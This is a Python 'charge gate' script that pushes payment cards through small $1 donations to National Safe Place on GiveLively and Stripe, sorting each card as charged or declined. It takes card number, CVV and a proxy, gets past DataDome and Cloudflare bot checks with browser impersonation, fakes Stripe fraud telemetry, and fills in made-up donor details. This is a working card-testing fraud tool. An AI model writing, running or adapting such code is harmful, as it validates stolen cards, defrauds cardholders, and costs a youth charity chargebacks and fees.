"""
Stripe Charge Gate - GiveLively (nspnetwork.org / National Safe Place)
Flow: nspnetwork.org/give -> givelively donate -> payment_intents -> payment_method -> checkout
Returns: {"status": "charged"|"approved"|"declined"|"error", "response": str}
"""

import json
import re
import uuid
import asyncio
import logging
import random
import time
from typing import Optional
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor

import httpx

logger = logging.getLogger(__name__)

try:
    import cloudscraper
    HAS_CLOUDSCRAPER = True
except ImportError:
    HAS_CLOUDSCRAPER = False

try:
    from curl_cffi import requests as curl_requests
    HAS_CURL_CFFI = True
except ImportError:
    HAS_CURL_CFFI = False

# Gate config
NSP_HOME = "https://www.nspnetwork.org/give"
GIVELIVELY_BASE = "https://secure.givelively.org"
GIVELIVELY_DONATE = "https://secure.givelively.org/donate/national-safe-place-inc"
STRIPE_PM_URL = "https://api.stripe.com/v1/payment_methods"
STRIPE_KEY = "pk_live_GWQnyoQBA8QSySDV4tPMyOgI"
TIMEOUT = 35
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36"

# Default values from user capture (may be parsed from page)
DEFAULT_CONTEXT_ID = "39060b53-ec1f-4172-871b-63cd75921567"
DEFAULT_ACCESS_TOKEN = "URP0jcc0oJTLkzCM5LKMmtnwCmFoFjxPaw1rA6EQl6E"

_executor = ThreadPoolExecutor(max_workers=8)


def _gen_guid() -> str:
    """Generate Stripe-style guid (32 hex chars, no dashes)."""
    return uuid.uuid4().hex[:32]


def _gen_muid() -> str:
    """Generate Stripe muid (uuid4 hex + suffix)."""
    return uuid.uuid4().hex + uuid.uuid4().hex[:16]


def _gen_sid() -> str:
    """Generate Stripe sid (uuid4 hex)."""
    return uuid.uuid4().hex + uuid.uuid4().hex[:16]


def _normalize_year(ano: str) -> str:
    yy = str(ano).strip()
    if len(yy) == 4 and yy.startswith("20"):
        return yy[2:]
    return yy


def _normalize_month(mes: str) -> str:
    m = str(mes).strip()
    return m.zfill(2) if len(m) == 1 else m


def _parse_givelively_page(html: str) -> dict:
    """Extract cart_id, context_id, access_token, csrf, stripe_key from GiveLively page."""
    out = {
        "cart_id": None,
        "donation_page_context_id": DEFAULT_CONTEXT_ID,
        "access_token": DEFAULT_ACCESS_TOKEN,
        "x_csrf_token": None,
        "stripe_key": STRIPE_KEY,
    }
    # Cart ID - multiple patterns (UUID format)
    uuid_pat = r'[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}'
    for pat in [
        r'/cart/(' + uuid_pat + r')',
        r'carts/(' + uuid_pat + r')',
        r'"cart_id"\s*:\s*"(' + uuid_pat + r')"',
        r'cartId["\']?\s*:\s*["\'](' + uuid_pat + r')["\']',
        r'cart_id["\']?\s*:\s*["\'](' + uuid_pat + r')["\']',
        r'"id"\s*:\s*"(' + uuid_pat + r')"[^}]*"cart"',
    ]:
        m = re.search(pat, html, re.I | re.DOTALL)
        if m:
            out["cart_id"] = m.group(1)
            break
    # donation_page_context_id
    m = re.search(r'donation_page_context_id["\']?\s*:\s*["\']([a-f0-9-]{36})["\']', html, re.I)
    if m:
        out["donation_page_context_id"] = m.group(1)
    m = re.search(r'"donation_page_context_id"\s*:\s*"([a-f0-9-]{36})"', html, re.I)
    if m:
        out["donation_page_context_id"] = m.group(1)
    # access_token
    m = re.search(r'access_token["\']?\s*:\s*["\']([A-Za-z0-9_-]{20,})["\']', html, re.I)
    if m:
        out["access_token"] = m.group(1)
    m = re.search(r'"access_token"\s*:\s*"([A-Za-z0-9_-]{20,})"', html, re.I)
    if m:
        out["access_token"] = m.group(1)
    # x-csrf-token
    m = re.search(r'["\']?x-csrf-token["\']?\s*:\s*["\']([^"\']+)["\']', html, re.I)
    if m:
        out["x_csrf_token"] = m.group(1)
    m = re.search(r'csrf["\s_-]*token["\']?\s*[:=]\s*["\']([^"\']{20,})["\']', html, re.I)
    if m:
        out["x_csrf_token"] = m.group(1)
    # Stripe key
    m = re.search(r'pk_live_[A-Za-z0-9]+', html)
    if m:
        out["stripe_key"] = m.group(0)
    return out


def _parse_checkout_response(data: dict) -> tuple:
    """Parse checkout JSON response. Returns (status, response_msg)."""
    if not data or not isinstance(data, dict):
        return "error", "NO_RESPONSE"
    # Success indicators
    if data.get("donation_id") or data.get("receipt_url") or data.get("confirmation_url"):
        return "charged", "DONATION_SUCCESSFUL"
    if data.get("id") and ("pi_" in str(data.get("id", "")) or "donation" in str(data.get("id", "")).lower()):
        return "charged", "DONATION_SUCCESSFUL"
    if data.get("success") is True:
        return "charged", "DONATION_SUCCESSFUL"
    # Payment intent status
    pi = data.get("payment_intent") or data.get("paymentIntent") or {}
    if isinstance(pi, str):
        pi = {}
    status = pi.get("status") or data.get("status") or ""
    if status in ("succeeded", "processing", "completed"):
        return "charged", "DONATION_SUCCESSFUL"
    if status == "requires_payment_method":
        err = (data.get("error") or {}).get("message") or data.get("message") or "CARD_DECLINED"
        return "declined", str(err).upper().replace(" ", "_")[:60]
    # Error extraction
    err = data.get("error") or data.get("message") or ""
    if isinstance(err, dict):
        err = err.get("message") or err.get("code") or ""
    if isinstance(data.get("errors"), list):
        for e in data["errors"]:
            if isinstance(e, dict):
                err = err or e.get("message") or e.get("detail") or e.get("error") or ""
            elif isinstance(e, str):
                err = err or e
    if isinstance(data.get("errors"), dict):
        for v in data["errors"].values():
            if isinstance(v, list) and v:
                err = err or str(v[0])
    err_lower = (err or "").lower()
    decline_terms = [
        "declined", "do not honor", "insufficient", "incorrect", "invalid",
        "expired", "lost", "stolen", "pickup", "restricted", "fraudulent",
        "cvc", "security code", "zip", "address", "transaction not allowed",
        "card was declined", "your card",
    ]
    for t in decline_terms:
        if t in err_lower:
            return "declined", (err or "CARD_DECLINED").upper().replace(" ", "_")[:60]
    if err:
        return "declined", str(err).upper().replace(" ", "_")[:60]
    return "error", "UNKNOWN_RESPONSE"


def _check_givelively_sync(card: str, mes: str, ano: str, cvv: str, proxy: str = None) -> dict:
    """Synchronous GiveLively Stripe Charge check."""
    try:
        mm = _normalize_month(mes)
        yy = _normalize_year(ano)
        # Normalize proxy format
        px = (proxy or "").strip()
        if px and not px.startswith(("http://", "https://")):
            px = f"http://{px}"
        proxies = {"http://": px, "https://": px} if px else None

        with httpx.Client(
            timeout=TIMEOUT,
            follow_redirects=True,
            proxies=proxies,
            headers={"User-Agent": USER_AGENT},
        ) as client:
            # 1. GET nspnetwork.org/give (home) - establish referer
            try:
                client.get(NSP_HOME, headers={"User-Agent": USER_AGENT})
            except Exception:
                pass

            # 2. GET GiveLively donate page (cloudscraper first for DataDome bypass)
            donate_params = {
                "recurring": "false",
                "override_amount": "1",
                "dedication_name": "",
                "dedication_email": "",
                "dedication_type": "",
                "widget_type": "simple_donation",
                "widget_url": "https://www.nspnetwork.org/give",
                "referrer_url": "",
                "isWixEmbedded": "false",
            }
            donate_headers = {
                "User-Agent": USER_AGENT,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Referer": "https://www.nspnetwork.org/",
                "sec-ch-ua": '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
                "Upgrade-Insecure-Requests": "1",
            }
            donate_html = None
            donate_url = None
            donate_cookies = {}
            last_status = None

            # Try cloudscraper first (DataDome/Cloudflare bypass)
            if HAS_CLOUDSCRAPER:
                try:
                    scraper = cloudscraper.create_scraper(
                        browser={"browser": "chrome", "platform": "windows", "mobile": False}
                    )
                    if proxy:
                        scraper.proxies = {"http": proxy, "https": proxy}
                    cs_resp = scraper.get(
                        GIVELIVELY_DONATE,
                        params=donate_params,
                        headers=donate_headers,
                        timeout=TIMEOUT,
                    )
                    last_status = cs_resp.status_code
                    if cs_resp.status_code == 200 and len(cs_resp.text or "") > 300:
                        donate_html = cs_resp.text
                        donate_url = str(cs_resp.url)
                        donate_cookies = dict(cs_resp.cookies)
                except Exception as ex:
                    logger.debug("Cloudscraper donate fetch failed: %s", ex)

            # Fallback: curl_cffi (Chrome impersonation, bypasses many bot checks)
            if not donate_html and HAS_CURL_CFFI:
                try:
                    curl_proxies = (proxy or "").strip()
                    curl_proxies = curl_proxies if curl_proxies else None
                    curl_resp = curl_requests.get(
                        GIVELIVELY_DONATE,
                        params=donate_params,
                        headers=donate_headers,
                        timeout=TIMEOUT,
                        impersonate="chrome120",
                        proxies={"http": curl_proxies, "https": curl_proxies} if curl_proxies else None,
                    )
                    last_status = curl_resp.status_code
                    if curl_resp.status_code == 200 and len(curl_resp.text or "") > 300:
                        donate_html = curl_resp.text
                        donate_url = str(curl_resp.url)
                        donate_cookies = dict(curl_resp.cookies)
                except Exception as ex:
                    logger.debug("curl_cffi donate fetch failed: %s", ex)

            # Fallback: httpx with full headers
            if not donate_html:
                try:
                    r_donate = client.get(
                        GIVELIVELY_DONATE,
                        params=donate_params,
                        headers=donate_headers,
                    )
                    last_status = r_donate.status_code
                    if r_donate.status_code == 200 and len(r_donate.text or "") > 300:
                        donate_html = r_donate.text
                        donate_url = str(r_donate.url)
                        donate_cookies = dict(r_donate.cookies)
                except Exception:
                    pass

            if not donate_html:
                if last_status and last_status != 200:
                    return {"status": "error", "response": f"DONATE_PAGE_{last_status}"}
                return {"status": "error", "response": "DONATE_PAGE_FAILED"}

            # Inject cookies from cloudscraper into client when cloudscraper was used
            if donate_cookies:
                for k, v in donate_cookies.items():
                    try:
                        client.cookies.set(k, str(v), domain=".givelively.org")
                    except Exception:
                        try:
                            client.cookies.set(k, str(v))
                        except Exception:
                            pass

            parsed = _parse_givelively_page(donate_html)
            cart_id = parsed["cart_id"]
            if not cart_id and donate_url:
                m = re.search(r'/cart/([a-f0-9-]{36})', donate_url, re.I)
                if m:
                    cart_id = m.group(1)
            # Fallback: try to create cart via API
            if not cart_id:
                try:
                    create_headers = {
                        "User-Agent": USER_AGENT,
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Origin": GIVELIVELY_BASE,
                        "Referer": f"{GIVELIVELY_BASE}/donate/national-safe-place-inc",
                    }
                    create_body = {
                        "donation_page_context_id": parsed["donation_page_context_id"],
                        "donation_page_context_type": "Nonprofit",
                        "access_token": parsed["access_token"],
                        "override_amount": 1,
                        "recurring": False,
                    }
                    cr = client.post(
                        f"{GIVELIVELY_BASE}/donate/national-safe-place-inc/carts",
                        json=create_body,
                        headers=create_headers,
                    )
                    if cr.status_code in (200, 201):
                        cj = cr.json() if cr.text else {}
                        cart_id = cj.get("id") or cj.get("cart_id")
                except Exception:
                    pass
            if not cart_id:
                return {"status": "error", "response": "NO_CART_ID"}

            context_id = parsed["donation_page_context_id"]
            access_token = parsed["access_token"]
            csrf = parsed["x_csrf_token"] or ""
            stripe_key = parsed["stripe_key"]

            base_headers = {
                "User-Agent": USER_AGENT,
                "Accept": "application/json",
                "Accept-Language": "en-US,en;q=0.9",
                "Content-Type": "application/json",
                "Origin": GIVELIVELY_BASE,
                "Referer": f"{GIVELIVELY_BASE}/donate/national-safe-place-inc/cart/{cart_id}/payment-method?recurring=false&override_amount=1&widget_type=simple_donation&widget_url=https%3A%2F%2Fwww.nspnetwork.org%2Fgive",
            }
            if csrf:
                base_headers["x-csrf-token"] = csrf

            # 3. POST payment_intents
            pi_data = {
                "donation_page_context_id": context_id,
                "donation_page_context_type": "Nonprofit",
                "access_token": access_token,
            }
            pi_resp = client.post(
                f"{GIVELIVELY_BASE}/carts/{cart_id}/payment_intents",
                json=pi_data,
                headers=base_headers,
            )
            if pi_resp.status_code != 200:
                return {"status": "error", "response": "PAYMENT_INTENT_FAILED"}

            # 4. POST cart_item_transaction_fees
            fee_data = {
                "payment_processor": "stripe",
                "payment_method_type": "visa",
                "donation_page_context_id": context_id,
                "donation_page_context_type": "Nonprofit",
                "access_token": access_token,
            }
            try:
                client.post(
                    f"{GIVELIVELY_BASE}/carts/{cart_id}/cart_item_transaction_fees",
                    json=fee_data,
                    headers=base_headers,
                )
            except Exception:
                pass

            # 5. Create Stripe payment method
            guid = _gen_guid()
            muid = _gen_muid()
            sid = _gen_sid()
            stripe_js_id = str(uuid.uuid4())
            time_on_page = random.randint(200000, 400000)

            pm_data = {
                "type": "card",
                "billing_details[name]": "Mass TH",
                "billing_details[email]": "playboy11not@gmail.com",
                "billing_details[address][postal_code]": "90001",
                "card[number]": card,
                "card[cvc]": cvv,
                "card[exp_month]": mm,
                "card[exp_year]": yy,
                "guid": guid,
                "muid": muid,
                "sid": sid,
                "payment_user_agent": "stripe.js/1239285b29; stripe-js-v3/1239285b29; card-element",
                "referrer": "https://secure.givelively.org",
                "time_on_page": str(time_on_page),
                "client_attribution_metadata[client_session_id]": stripe_js_id,
                "client_attribution_metadata[merchant_integration_source]": "elements",
                "client_attribution_metadata[merchant_integration_subtype]": "card-element",
                "client_attribution_metadata[merchant_integration_version]": "2017",
                "key": stripe_key,
            }
            # Stripe payment_method (radar_options hcaptcha optional - try without first)
            pm_resp = client.post(
                STRIPE_PM_URL,
                data=pm_data,
                headers={
                    "User-Agent": USER_AGENT,
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Origin": "https://js.stripe.com",
                    "Referer": "https://js.stripe.com/",
                },
            )

            try:
                pm_json = pm_resp.json()
            except Exception:
                return {"status": "error", "response": "INVALID_STRIPE_RESPONSE"}

            if "error" in pm_json:
                err = pm_json["error"]
                msg = err.get("message", "CARD_DECLINED")
                code = (err.get("code") or "").lower()
                if "radar" in code or "captcha" in (msg or "").lower():
                    return {"status": "error", "response": "CAPTCHA_REQUIRED"}
                return {"status": "declined", "response": msg.upper().replace(" ", "_")[:60]}

            pm_id = pm_json.get("id")
            if not pm_id or not pm_id.startswith("pm_"):
                return {"status": "error", "response": "NO_PAYMENT_METHOD_ID"}

            # 6. POST checkout
            idempotency_key = str(uuid.uuid4())
            checkout_data = {
                "checkout": {
                    "name": "Mass TH",
                    "email": "playboy11not@gmail.com",
                    "payment_method_id": pm_id,
                    "payment_method_type": "visa",
                    "transaction_fee_covered": False,
                    "tip_amount": 0,
                    "order_tracking_attributes": {
                        "utm_source": None,
                        "widget_type": "simple_donation",
                        "widget_url": "https://www.nspnetwork.org/give",
                        "referrer_url": "",
                        "page_url": None,
                    },
                    "donor_information": {
                        "address": {
                            "street_address": "7th St",
                            "custom_field": "bridge road",
                            "administrative_area_level_2": "Los Angeles",
                            "administrative_area_level_1": "CA",
                            "postal_code": "90008",
                        },
                        "phone": {"number": "7472920712"},
                    },
                    "answers_attributes": [],
                },
                "anonymous_to_public": False,
                "donation_page_context_id": context_id,
                "donation_page_context_type": "Nonprofit",
                "access_token": access_token,
                "idempotency_key": idempotency_key,
            }

            checkout_resp = client.post(
                f"{GIVELIVELY_BASE}/carts/{cart_id}/payment_intents/checkout",
                json=checkout_data,
                headers=base_headers,
            )

            try:
                checkout_json = checkout_resp.json()
            except Exception:
                text = (checkout_resp.text or "").strip()
                if len(text) < 50:
                    return {"status": "error", "response": "EMPTY_RESPONSE"}
                return {"status": "error", "response": "INVALID_CHECKOUT_RESPONSE"}

            status, msg = _parse_checkout_response(checkout_json)
            return {"status": status, "response": msg}

    except httpx.TimeoutException:
        return {"status": "error", "response": "TIMEOUT"}
    except Exception as e:
        return {"status": "error", "response": str(e).upper().replace(" ", "_")[:50]}


async def async_givelively_charge_gate(card: str, mes: str, ano: str, cvv: str, proxy: str = None) -> dict:
    """Async wrapper for GiveLively Stripe Charge gate."""
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(
        _executor,
        _check_givelively_sync,
        card, mes, ano, cvv, proxy,
    )
